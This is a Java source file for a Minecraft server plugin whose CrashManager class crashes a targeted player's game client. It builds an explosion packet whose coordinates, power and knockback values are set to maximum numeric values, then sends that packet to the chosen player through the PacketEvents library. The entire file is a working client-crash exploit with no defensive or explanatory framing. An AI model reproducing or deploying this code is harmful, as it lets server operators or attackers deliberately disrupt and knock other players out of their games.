package ru.quizie.cfcrashplayer.crash;

import com.github.retrooper.packetevents.PacketEvents;
import com.github.retrooper.packetevents.util.Vector3d;
import com.github.retrooper.packetevents.util.Vector3f;
import com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerExplosion;
import org.bukkit.entity.Player;

import java.util.ArrayList;

public class CrashManager {

    private WrapperPlayServerExplosion crashPacket;

    public void initCrashPacket() {
        if (crashPacket != null) return;
        crashPacket = new WrapperPlayServerExplosion(
                new Vector3d(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE),
                Float.MAX_VALUE,
                new ArrayList<>(),
                new Vector3f(Integer.MAX_VALUE, Integer.MAX_VALUE, Integer.MAX_VALUE));
    }

    public void crashPlayer(final Player player) {
        PacketEvents.getAPI().getPlayerManager().sendPacket(player, crashPacket);
    }
}
